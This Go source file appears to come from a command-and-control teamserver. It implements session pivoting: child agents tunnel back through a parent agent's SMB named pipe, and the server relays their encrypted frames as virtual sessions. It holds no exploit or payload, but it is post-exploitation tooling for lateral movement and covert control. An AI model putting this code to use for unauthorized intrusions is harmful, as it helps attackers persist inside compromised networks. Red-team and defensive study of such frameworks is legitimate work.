package pivot

// 会话借道 TS 半边: 子 Agent 经父 Agent 的 SMB 管道回连,
// 其会话密文帧经既有 PivotData 透传到达 TS; TS 侧把该字节流伪装成一条
// protocol.Conn(net.Pipe), 用子 Agent 部署 listener 的加密盒解密 —— 子会话
// 即为普通会话(SessionMachine/心跳/命令派发全复用), 仅底层连接被替换。
//
// 数据路径:
//   上行: A 透传 PivotData{pivot_id:"sess-<name>"} → handleSessionData
//         → child.Write(bin) → B 会话 runLoop(ReadFrame 解密) → handleOne
//   下行: B 会话 sendFrame → parent.Write(落线帧) → relay goroutine 读
//         → pushData(sess-x, A) → APIHybridPush(A) → A 写管道 → B 解密
//
// 帧边界: 管道两侧的传输粒度都是"一条 B 会话落线帧"(Agent PipeChannel 与
// protocol.Conn 的 [4B 大端长度][加密体] 同构), relay 按块透传不重组。
//
// 加密: B 的会话加密盒(cbox/xbox)来自 B 部署所用的 listener(CryptoForAddr),
// 父节点只见密文; B 的 FirstConnect 经管道进入既有身份解析(machine_id 复用/新建)。

import (
	"fmt"
	"net"

	"cleat/teamserver/internal/logx"
	"cleat/teamserver/internal/protocol"
	"cleat/teamserver/internal/session"
)

// virtualPipe 一条会话借道链路: 子会话(B) ↔ 父会话(A) 的 sess-x 通道。
type virtualPipe struct {
	SessID    string // "sess-<pipe_name>"
	PipeName  string // <pipe_name>
	ParentSID int    // 父会话(A)的 TS 会话 ID
	Listen    string // 子 Agent 部署 listener(记录用)
	Child     net.Conn
}

// PipeEntry 一个会话借道入口凭据登记(StartPipeEntry 生成, 操作员凭据打印用)。
type PipeEntry struct {
	SessionID  int
	PipeName   string
	Key        string
	ListenAddr string // 子 Agent 部署所用的 listener(虚拟会话加密盒来源)
}

// sessIDPrefix 会话借道 pivot_id 的前缀约定(Agent 侧 PipeSessionHub 同款)。
const sessIDPrefix = "sess-"

// IsSessionId 判定 pivot_id 是否会话借道流量。
func IsSessionId(pivotID string) bool {
	return len(pivotID) > len(sessIDPrefix) && pivotID[:len(sessIDPrefix)] == sessIDPrefix
}

// PipeNameOf "sess-<pipe_name>" → <pipe_name>; 非会话 id 返回空。
func PipeNameOf(sessID string) string {
	if !IsSessionId(sessID) {
		return ""
	}
	return sessID[len(sessIDPrefix):]
}

// StartPipeEntry 为指定会话生成入口凭据并下发 PivotListenPipe(Agent 侧
// PipeSessionHub 监听)。凭据打印给操作员, 供子 Agent 部署配置使用。
// listenAddr 决定子会话的加密盒(与子 Agent 部署所用 listener 一致)。
func (p *Pivot) StartPipeEntry(sid int, listenAddr string) (PipeEntry, error) {
	if sid <= 0 {
		return PipeEntry{}, fmt.Errorf("无效会话 #%d", sid)
	}
	if _, _, ok := p.mgr.CryptoForAddr(listenAddr); !ok {
		return PipeEntry{}, fmt.Errorf("listener %s 不存在", listenAddr)
	}
	entry := PipeEntry{
		SessionID:  sid,
		PipeName:   "sp-" + randHex(6),
		Key:        randHex(16),
		ListenAddr: listenAddr,
	}
	resp, err := p.mgr.APICommand(sid, session.CmdPivotListenPipe, map[string]interface{}{
		"pipe_name": entry.PipeName,
		"key":       entry.Key,
	})
	if err != nil {
		return PipeEntry{}, err
	}
	if resp == nil || resp["status"] != "success" {
		return PipeEntry{}, fmt.Errorf("agent 拒绝: %v", resp)
	}
	p.pipeEntriesMu.Lock()
	p.pipeEntries[entry.PipeName] = entry
	p.pipeEntriesMu.Unlock()
	logx.Printf("[pipesess] 会话 #%d 入口开启 %s (key=%s, listener=%s)\n",
		sid, entry.PipeName, entry.Key, listenAddr)
	return entry, nil
}

// StopPipeEntry 关闭入口(撤销 PivotListenPipe)。
func (p *Pivot) StopPipeEntry(pipeName string) error {
	p.pipeEntriesMu.Lock()
	ent, ok := p.pipeEntries[pipeName]
	delete(p.pipeEntries, pipeName)
	p.pipeEntriesMu.Unlock()
	if !ok {
		return fmt.Errorf("入口 %s 不存在", pipeName)
	}
	resp, err := p.mgr.APICommand(ent.SessionID, session.CmdPivotPipeStop, map[string]interface{}{
		"pipe_name": pipeName,
	})
	if err != nil {
		return err
	}
	if resp == nil || resp["status"] != "success" {
		return fmt.Errorf("agent 拒绝: %v", resp)
	}
	return nil
}

// PipeEntryInfos 返回入口凭据登记列表(操作员查看)。
func (p *Pivot) PipeEntryInfos() []PipeEntry {
	p.pipeEntriesMu.Lock()
	defer p.pipeEntriesMu.Unlock()
	out := make([]PipeEntry, 0, len(p.pipeEntries))
	for _, e := range p.pipeEntries {
		out = append(out, e)
	}
	return out
}

// VirtualLinkInfo 会话借道链路边(拓扑/CLI 用)。
type VirtualLinkInfo struct {
	ParentSID int
	PipeName  string
}

func (p *Pivot) VirtualLinkInfos() []VirtualLinkInfo {
	p.virtMu.Lock()
	defer p.virtMu.Unlock()
	out := make([]VirtualLinkInfo, 0, len(p.virtualPipes))
	for _, vp := range p.virtualPipes {
		out = append(out, VirtualLinkInfo{
			ParentSID: vp.ParentSID,
			PipeName:  vp.PipeName,
		})
	}
	return out
}

// handleSessionData PivotData 的 sess- 前缀分流(Pivot.handleData 前置调用):
// 把父会话透传上来的字节写入对应虚拟会话; 未登记时以首帧创建虚拟会话。
func (p *Pivot) handleSessionData(parent *session.Session, sessID string, bin []byte) {
	p.virtMu.Lock()
	vp := p.virtualPipes[sessID]
	p.virtMu.Unlock()
	if vp != nil {
		// 已登记: 写 child → B 会话 runLoop 在另一端解密
		if _, err := vp.Child.Write(bin); err != nil {
			logx.Printf("[pipesess] %s child 写入失败: %v\n", sessID, err)
			p.closeVirtual(sessID)
		}
		return
	}
	// 未登记: 首帧 = 子会话注册(FirstConnect), 先建虚拟会话再写入
	if !p.createVirtual(parent, sessID) {
		return
	}
	p.virtMu.Lock()
	vp = p.virtualPipes[sessID]
	p.virtMu.Unlock()
	if vp == nil {
		return
	}
	if _, err := vp.Child.Write(bin); err != nil {
		logx.Printf("[pipesess] %s 首帧写入失败: %v\n", sessID, err)
		p.closeVirtual(sessID)
	}
}

// createVirtual 为 sessID 创建虚拟会话: net.Pipe 伪装连接 + 子会话 listener
// 加密盒 + AcceptConn(内部 runLoop 驱动) + 下行 relay goroutine。
func (p *Pivot) createVirtual(parent *session.Session, sessID string) bool {
	pipeName := PipeNameOf(sessID)
	if pipeName == "" {
		return false
	}
	// 入口登记 → 子会话的 listener(凭据生成时绑定, 决定加密盒)
	p.pipeEntriesMu.Lock()
	ent, ok := p.pipeEntries[pipeName]
	p.pipeEntriesMu.Unlock()
	if !ok {
		logx.Printf("[pipesess] %s 未登记的入口(pipe_name=%s), 丢弃\n", sessID, pipeName)
		return false
	}
	cbox, xbox, ok := p.mgr.CryptoForAddr(ent.ListenAddr)
	if !ok {
		logx.Printf("[pipesess] %s listener %s 已移除, 丢弃\n", sessID, ent.ListenAddr)
		return false
	}

	parentConn, child := net.Pipe()
	vconn := protocol.NewConn(parentConn, cbox, xbox, false)

	vp := &virtualPipe{
		SessID:    sessID,
		PipeName:  pipeName,
		ParentSID: parent.ID(),
		Listen:    ent.ListenAddr,
		Child:     child,
	}
	p.virtMu.Lock()
	p.virtualPipes[sessID] = vp
	p.virtMu.Unlock()

	// 下行 relay: B 会话 sendFrame → parent 端写出 → child 端读到 → 经 A 透传
	go p.relayDown(sessID, parent.ID(), child)

	// 子会话 runLoop: ReadFrame(解密) → handleOne(FirstConnect 身份解析/命令派发)。
	// runLoop 退出 = 管道断开/子会话离线 → 注销虚拟会话。
	go func() {
		// 通道类型 = pipe(命名管道虚拟会话), 随会话写入 transport 列。
		p.mgr.AcceptConn(vconn, "pipe")
		p.closeVirtual(sessID)
	}()
	logx.Printf("[pipesess] %s 虚拟会话创建(pipe=%s parent=#%d)\n",
		sessID, pipeName, parent.ID())
	return true
}

// relayDown 把 B 会话的下行落线帧经 A 透传(独立 goroutine, 阻塞读)。
// child 关闭(parent 端关闭/B 会话离线)时 Read 报错退出。
func (p *Pivot) relayDown(sessID string, parentSID int, child net.Conn) {
	buf := make([]byte, 64*1024)
	for {
		n, err := child.Read(buf)
		if n > 0 {
			if werr := p.pushData(sessID, parentSID, buf[:n]); werr != nil {
				logx.Printf("[pipesess] %s 下行透传失败: %v\n", sessID, werr)
				return
			}
		}
		if err != nil {
			return
		}
	}
}

// closeVirtual 关闭并注销虚拟会话(child 关闭连带子会话 runLoop 退出 → 离线事件)。
func (p *Pivot) closeVirtual(sessID string) {
	p.virtMu.Lock()
	vp := p.virtualPipes[sessID]
	delete(p.virtualPipes, sessID)
	p.virtMu.Unlock()
	if vp == nil {
		return
	}
	_ = vp.Child.Close()
	logx.Printf("[pipesess] %s 虚拟会话关闭\n", sessID)
}

// closeVirtualByParent 父会话离线的级联清理(Pivot.closeSession 调用)。
// 子会话的 runLoop 随 child 关闭退出 → MarkOffline → 离线事件级联到链尾。
func (p *Pivot) closeVirtualByParent(parentSID int) {
	p.virtMu.Lock()
	var children []net.Conn
	var ids []string
	for id, vp := range p.virtualPipes {
		if vp.ParentSID == parentSID {
			children = append(children, vp.Child)
			ids = append(ids, id)
		}
	}
	for _, id := range ids {
		delete(p.virtualPipes, id)
	}
	p.virtMu.Unlock()
	for _, c := range children {
		_ = c.Close()
	}
	if len(ids) > 0 {
		logx.Printf("[pipesess] 父会话 #%d 离线, 级联关闭子会话: %v\n", parentSID, ids)
	}
}
